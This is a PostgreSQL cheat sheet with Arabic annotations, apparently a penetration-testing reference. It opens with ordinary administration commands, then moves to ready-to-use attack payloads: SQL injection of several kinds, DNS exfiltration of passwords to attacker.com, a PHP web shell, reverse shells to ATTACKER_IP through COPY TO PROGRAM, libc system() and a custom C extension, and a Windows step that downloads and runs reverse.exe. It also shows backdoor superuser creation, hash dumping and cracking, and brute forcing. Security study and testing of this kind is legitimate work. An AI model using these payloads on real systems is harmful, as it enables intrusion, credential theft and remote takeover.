
# 🐘 PostgreSQL Cheat Sheet

  

> مرجع شامل · الاتصال · Enumeration · SQLi · RCE · ملفات · صيانة

  

---

  

## 🔌 الاتصال / Connect

  

```bash

# افتراضي

psql -h HOST -p 5432 -U postgres

  

# مع قاعدة بيانات محددة

psql -h HOST -p 5432 -U USER -d DBNAME

  

# تنفيذ أمر مباشر

psql -h HOST -U USER -c "SELECT version();"

  

# من ملف

psql -h HOST -U USER -d DBNAME -f script.sql

  

# URL format

postgresql://USER:PASS@HOST:5432/DBNAME

```

  

---

  

## ⌨️ أوامر psql

  

| الأمر | الوصف |

|-------|-------|

| `\l` | عرض كل قواعد البيانات |

| `\c DBNAME` | الاتصال بقاعدة بيانات |

| `\dt` | عرض الجداول |

| `\dt *.*` | جداول من كل الـ schemas |

| `\d TABLE` | وصف الجدول (أعمدة + indexes + constraints) |

| `\d+ TABLE` | وصف تفصيلي |

| `\du` | عرض المستخدمين والأدوار |

| `\du+` | صلاحيات تفصيلية |

| `\dn` | عرض الـ schemas |

| `\df` | عرض الدوال |

| `\dx` | الامتدادات المثبتة |

| `\lo_list` | Large Objects |

| `\timing` | تفعيل توقيت الاستعلامات |

| `\! CMD` | تنفيذ أمر shell |

| `\q` | الخروج |

  

---

  

## ℹ️ معلومات عامة

  

```sql

SELECT version();

SELECT current_database();

SELECT current_schema();

SELECT current_user;

SELECT session_user;

SELECT inet_server_addr();

SELECT inet_server_port();

SHOW server_version;

SHOW all;

```

  

---

  

## 🗄️ قواعد البيانات والجداول

  

```sql

-- قواعد البيانات

SELECT datname FROM pg_database;

  

-- الـ Schemas

SELECT DISTINCT(schemaname) FROM pg_tables;

SELECT schema_name FROM information_schema.schemata;

  

-- الجداول

SELECT table_name FROM information_schema.tables;

SELECT table_name FROM information_schema.tables WHERE table_schema='public';

SELECT tablename FROM pg_tables WHERE schemaname='public';

  

-- الأعمدة

SELECT column_name, data_type

FROM information_schema.columns

WHERE table_name='users';

  

-- الأعمدة الحساسة

SELECT table_name, column_name

FROM information_schema.columns

WHERE column_name LIKE '%password%'

   OR column_name LIKE '%pass%'

   OR column_name LIKE '%secret%'

   OR column_name LIKE '%token%'

   OR column_name LIKE '%key%';

  

-- حجم الجداول

SELECT relname, n_live_tup

FROM pg_stat_user_tables

ORDER BY n_live_tup DESC;

```

  

---

  

## 👤 المستخدمون والصلاحيات

  

```sql

-- عرض المستخدمين

SELECT usename, usesuper, usecreatedb FROM pg_user;

SELECT usename, passwd FROM pg_shadow;      -- ⚠️ superuser فقط

SELECT * FROM pg_authid;

  

-- Superusers

SELECT usename FROM pg_user WHERE usesuper IS TRUE;

SHOW is_superuser;

SELECT current_setting('is_superuser');

SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;

  

-- صلاحيات الجداول

SELECT * FROM information_schema.role_table_grants

WHERE grantee = current_user

AND table_schema NOT IN ('pg_catalog','information_schema');

  

-- إنشاء مستخدم

CREATE USER alice WITH PASSWORD 'pass123';

CREATE USER backdoor WITH PASSWORD 'pass' SUPERUSER CREATEDB CREATEROLE;

  

-- ترقية صلاحيات

ALTER USER alice WITH SUPERUSER;

  

-- منح صلاحيات

GRANT ALL PRIVILEGES ON DATABASE mydb TO alice;

GRANT ALL ON ALL TABLES IN SCHEMA public TO alice;

  

-- سحب صلاحيات

REVOKE ALL ON employees FROM alice;

  

-- حذف مستخدم

DROP USER alice;

  

-- تغيير كلمة مرور

\password username

```

  

---

  

## 📋 CRUD

  

```sql

-- إنشاء جدول

CREATE TABLE IF NOT EXISTS employees (

  id     SERIAL PRIMARY KEY,

  name   VARCHAR(100) NOT NULL,

  salary NUMERIC(9,2)

);

  

-- إضافة

INSERT INTO employees (name, salary) VALUES ('Ahmed', 5000);

  

-- قراءة

SELECT * FROM employees WHERE salary >= 5000 ORDER BY name LIMIT 10 OFFSET 0;

  

-- تعديل آمن

BEGIN;

  UPDATE employees SET salary = 6000 WHERE name = 'Ahmed';

COMMIT; -- أو ROLLBACK

  

-- حذف

DELETE FROM employees WHERE id = 5;

  

-- حذف الجدول

DROP TABLE IF EXISTS employees;

```

  

---

  

## 🔤 دوال النصوص

  

```sql

length('hello')                  -- 5

upper('hello')                   -- HELLO

lower('WORLD')                   -- world

substr('foobar', 4, 2)           -- ba

substring('foobar', 4, 2)        -- ba

substring('foobar' FROM 4 FOR 2) -- ba

trim('  hello  ')                -- hello

replace('a,b', ',', '|')        -- a|b

position('lo' IN 'hello')        -- 4

chr(65)                          -- A

ascii('A')                       -- 65

'A' || 'B'                       -- AB  (concatenation)

CHR(114)||CHR(111)||CHR(111)||CHR(116)  -- root (بدون quotes)

```

  

---

  

## ⚡ الفهارس (Indexes)

  

```sql

-- إنشاء

CREATE INDEX idx_name ON employees USING btree (name ASC);

CREATE UNIQUE INDEX idx_email ON users(email);

  

-- عرض

\di

SELECT * FROM pg_indexes WHERE tablename='employees';

  

-- حذف

DROP INDEX idx_name;

```

  

---

  

## 💾 النسخ الاحتياطي والاستعادة

  

```bash

# نسخ احتياطي

pg_dump mydb > mydb.sql

pg_dump -Fc mydb > mydb.dump          # custom format

pg_dump -h HOST -U postgres mydb > mydb.sql

pg_dumpall > all_databases.sql

  

# استعادة

psql -U postgres -f mydb.sql

pg_restore -d mydb mydb.dump -U postgres

```

  

---

  

## 🔧 الصيانة والمراقبة

  

```sql

-- تنظيف الفضاء

VACUUM employees;

VACUUM(verbose, analyze) employees;

  

-- تحديث الإحصائيات

ANALYZE employees;

  

-- مراقبة الجلسات

SELECT pid, datname, usename, state, query

FROM pg_stat_activity;

  

-- إيقاف استعلام

SELECT pg_cancel_backend(pid);

SELECT pg_terminate_backend(pid);  -- إنهاء قسري

  

-- أكبر الجداول

SELECT nspname||'.'||relname AS name,

       pg_size_pretty(pg_relation_size(C.oid)) AS size

FROM pg_class C

LEFT JOIN pg_namespace N ON N.oid = C.relnamespace

WHERE nspname NOT IN ('pg_catalog','information_schema')

ORDER BY pg_relation_size(C.oid) DESC

LIMIT 20;

```

  

---

  

## 📍 ملفات الإعداد

  

```sql

SHOW config_file;       -- postgresql.conf

SHOW hba_file;          -- pg_hba.conf

SHOW data_directory;

SHOW log_directory;

```

  

```

# مسارات شائعة

/etc/postgresql/14/main/postgresql.conf

/etc/postgresql/14/main/pg_hba.conf

/var/lib/postgresql/data/

```

  

---

  

---

  

# 🟥 SQL Injection (PostgreSQL)

  

> تُستخدم داخل مدخل vulnerable (GET / POST / Cookie …)

  

---

  

## التعليقات في SQLi

  

```sql

-- Single line

/* Multi-line */

```

  

---

  

## UNION-Based SQLi

  

```sql

-- تحديد عدد الأعمدة

UNION SELECT NULL

UNION SELECT NULL,NULL

UNION SELECT NULL,NULL,NULL

  

-- معلومات أساسية

UNION SELECT version()--

UNION SELECT current_user--

UNION SELECT session_user--

UNION SELECT current_database()--

  

-- الـ Schemas

UNION SELECT table_schema FROM information_schema.tables--

  

-- الجداول

UNION SELECT table_name FROM information_schema.tables--

UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

  

-- الأعمدة

UNION SELECT column_name FROM information_schema.columns WHERE table_schema='public'--

UNION SELECT table_name||':'||column_name FROM information_schema.columns WHERE table_schema='public'--

  

-- سحب البيانات

UNION SELECT username||':'||password FROM users--

UNION SELECT username||':'||password||':'||email FROM users--

UNION SELECT id||':'||name||':'||price FROM products--

```

  

---

  

## Error-Based SQLi (CAST)

  

```sql

AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)--

AND CAST((SELECT version()) AS INT)=1337--

AND (SELECT version())::int=1--

  

-- سحب بيانات

CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)--

CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)--

CAST(chr(126)||(SELECT password FROM users LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)--

  

-- نسخة أخرى

' AND 1=CAST((SELECT concat('DB: ',current_database())) AS int) AND '1'='1

```

  

### XML Helper (كل النتائج دفعة واحدة)

  

```sql

SELECT query_to_xml('SELECT * FROM users', true, true, '');

```

  

---

  

## Boolean-Based Blind SQLi

  

```sql

' AND 1=1--   -- TRUE

' AND 1=2--   -- FALSE

  

' AND LENGTH(current_database()) > 5--

' AND ASCII(SUBSTRING(current_user,1,1)) > 64--

' AND SUBSTR(version(),1,10) = 'PostgreSQL'--

' AND SUBSTR(version(),1,10) = 'PostgreXXX'--  -- FALSE

```

  

---

  

## Time-Based Blind SQLi

  

```sql

-- تأكيد الـ injection

SELECT pg_sleep(5)

;(SELECT pg_sleep(5))

||(SELECT pg_sleep(5))

AND 'x'||pg_sleep(5)='x'

  

-- استخراج اسم قاعدة البيانات

SELECT CASE WHEN substring(datname,1,1)='p'

  THEN pg_sleep(5) ELSE pg_sleep(0) END

FROM pg_database LIMIT 1

  

-- استخراج اسم جدول

SELECT CASE WHEN substring(table_name,1,1)='a'

  THEN pg_sleep(5) ELSE pg_sleep(0) END

FROM information_schema.tables LIMIT 1

  

-- استخراج بيانات

AND CASE WHEN substring(password,1,1)='a'

  THEN pg_sleep(5) ELSE pg_sleep(0) END

FROM users WHERE username='admin' LIMIT 1

  

AND [RANDNUM]=(SELECT [RANDNUM] FROM pg_sleep(5))

AND [RANDNUM]=(SELECT COUNT(*) FROM generate_series(1,5000000))

```

  

---

  

## Stacked Queries

  

```sql

; CREATE TABLE hacked(data text);--

; INSERT INTO users(username,password) VALUES ('attacker','123');--

SELECT 1; CREATE TABLE test(x text);--

```

  

---

  

## Out-of-Band (OOB)

  

```sql

-- DNS exfiltration عبر COPY TO PROGRAM

COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com'

  

-- Function-based OOB

CREATE OR REPLACE FUNCTION f() RETURNS void AS $$

DECLARE p text;

BEGIN

  SELECT INTO p (SELECT password FROM users LIMIT 1);

  EXECUTE 'COPY (SELECT '''') TO PROGRAM ''nslookup '||p||'.attacker.com''';

END;

$$ LANGUAGE plpgsql SECURITY DEFINER;

SELECT f();

```

  

---

  

## WAF Bypass

  

```sql

-- بديل الـ quotes

SELECT CHR(65)||CHR(66)||CHR(67)        -- ABC

SELECT $tag$payload here$tag$           -- dollar quoting (>= v8)

  

-- بديل spaces

SELECT/**/version()

SELECT(version())

  

-- Case variation

SeLeCt VeRsIoN()

```

  

---

  

---

  

# 🟨 File Operations

  

## قراءة الملفات

  

```sql

-- pg_read_file (superuser / pg_read_server_files)

SELECT pg_read_file('/etc/passwd');

SELECT pg_read_file('/etc/passwd', 0, 200);

SELECT pg_read_file(current_setting('config_file'));

SELECT pg_read_file(current_setting('hba_file'));

  

-- عبر COPY

CREATE TABLE tmp(t TEXT);

COPY tmp FROM '/etc/passwd';

SELECT * FROM tmp LIMIT 1 OFFSET 0;

DROP TABLE tmp;

  

-- عبر Large Objects

SELECT lo_import('/etc/passwd');       -- يرجع OID

SELECT lo_get(12345);                  -- استخدم الـ OID

SELECT convert_from(lo_get(12345),'UTF8');

  

-- directory listing

SELECT pg_ls_dir('/');

SELECT pg_ls_dir('/var/www/html');

  

-- فحص ملف

SELECT pg_stat_file('/etc/passwd');

```

  

## كتابة الملفات

  

```sql

-- COPY (الأبسط)

COPY (SELECT 'content here') TO '/tmp/out.txt';

COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

  

-- COPY متعدد الأسطر

CREATE TABLE nc(t TEXT);

INSERT INTO nc(t) VALUES('nc -lvvp 4444 -e /bin/bash');

COPY nc(t) TO '/tmp/nc.sh';

  

-- عبر Large Objects

SELECT lo_from_bytea(43210, 'file content here');

SELECT lo_put(43210, 20, 'appended data');

SELECT lo_export(43210, '/tmp/output');

```

  

---

  

# 🟥 Command Execution (RCE)

## COPY TO/FROM PROGRAM

> يتطلب: superuser أو `pg_execute_server_program` · PostgreSQL >= 9.3


```sql
-- تأكيد التنفيذ
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';
COPY (SELECT '') TO PROGRAM 'whoami > /tmp/out.txt';

-- DNS callback
COPY (SELECT '') TO PROGRAM 'nslookup attacker.com';
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).attacker.com';

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';

-- mkfifo
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f';

-- Python
COPY (SELECT '') TO PROGRAM 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"';
```

## COPY FROM PROGRAM — Windows


```sql
-- تحميل reverse shell من attacker
CREATE TABLE shell(cmd_output text);
COPY shell FROM PROGRAM 'powershell /c wget http://ATTACKER_IP/reverse.exe -o reverse.exe';

-- تشغيل الـ reverse shell
COPY shell FROM PROGRAM 'reverse.exe';
SELECT * FROM shell;

-- تنظيف
DROP TABLE shell;
```

---

## libc.so.6 (system call)

```sql
CREATE OR REPLACE FUNCTION system(cstring)
RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system'
LANGUAGE 'C' STRICT;

SELECT system('id');
SELECT system('cat /etc/passwd | nc ATTACKER_IP 4444');
SELECT system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
```

## UDF — Custom C Extension


```sql
-- بعد رفع pg_exec.so عبر Large Objects
SELECT lo_create(12345);
-- رفع الـ .so chunks ثم:
SELECT lo_export(12345, '/tmp/pg_exec.so');

CREATE FUNCTION sys(cstring) RETURNS int
AS '/tmp/pg_exec.so','pg_exec'
LANGUAGE C STRICT;

SELECT sys('id');
SELECT sys('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
```

---

# 🔐 Privilege Escalation

```sql
-- إنشاء superuser
CREATE USER backdoor WITH PASSWORD 'P@ss!' SUPERUSER;

-- ترقية مستخدم موجود
ALTER USER existing_user WITH SUPERUSER;

-- تغيير الـ role
SET ROLE postgres;
SET SESSION AUTHORIZATION postgres;

-- منح صلاحيات كاملة
GRANT ALL PRIVILEGES ON DATABASE target TO backdoor;
GRANT ALL ON ALL TABLES IN SCHEMA public TO backdoor;
```
  

---

  

# 🔑 Hash Extraction & Cracking

  

```sql

-- استخراج الـ hashes (superuser)

SELECT usename, passwd FROM pg_shadow;

SELECT usename || ':' || passwd FROM pg_shadow;

```

  

```bash

# حفظ الـ hashes

psql -h TARGET -U postgres -c "SELECT usename||':'||passwd FROM pg_shadow;" > hashes.txt

  

# كسر SCRAM-SHA-256

hashcat -m 28600 hashes.txt rockyou.txt

  

# كسر MD5 (إصدارات قديمة)

hashcat -m 0 hashes.txt rockyou.txt

  

# John the Ripper

john --format=postgres hashes.txt

```

  

---

  

# 🔍 Brute Force

  

```bash

# Hydra

hydra -l postgres -P /usr/share/wordlists/rockyou.txt TARGET postgres

  

# Nmap script

nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt TARGET

  

# Metasploit

use auxiliary/scanner/postgres/postgres_login

set RHOSTS TARGET

set PASS_FILE passwords.txt

run

```

  

---

  

# 🛠️ الأدوات

  

| الأداة | الاستخدام |

|--------|-----------|

| `psql` | عميل مباشر |

| `pg_dump` / `pg_dumpall` | نسخ احتياطي واستخراج |

| `sqlmap --os-shell` | SQLi → shell تلقائي |

| `hydra` | Brute force |

| `nmap --script pgsql-*` | Recon وbrute |

| `hashcat -m 28600` | كسر SCRAM-SHA-256 |

| `metasploit` | modules جاهزة |

  

---

  

# ⚠️ أخطاء الإعداد الشائعة

  

| ❌ الخطأ | ✅ الحل |

|----------|---------|

| بيانات دخول افتراضية `postgres:postgres` | تغيير الكلمة فوراً |

| Superuser متاح عن بعد | تقييد الوصول بـ `pg_hba.conf` |

| `pg_hba.conf` يسمح بـ `trust` | استخدام `md5` أو `scram-sha-256` |

| `COPY PROGRAM` لغير superuser | سحب الصلاحية |

| بدون SSL/TLS | تفعيل `ssl = on` |

| Logging معطّل | تفعيل `log_connections` و`log_statements` |

| إصدار قديم | تحديث منتظم |

| امتدادات غير ضرورية | `DROP EXTENSION extension_name` |

| بدون حدود للاتصالات | `ALTER ROLE user CONNECTION LIMIT 10` |

  

---

  

## CVEs مهمة

  

| CVE | الوصف |

|-----|-------|

| CVE-2019-9193 | Authenticated RCE عبر `COPY FROM PROGRAM` · v9.3–11.2 |

| CVE-2018-1058 | Search Path Manipulation |

  

---

  

*PostgreSQL Default Port: **5432***







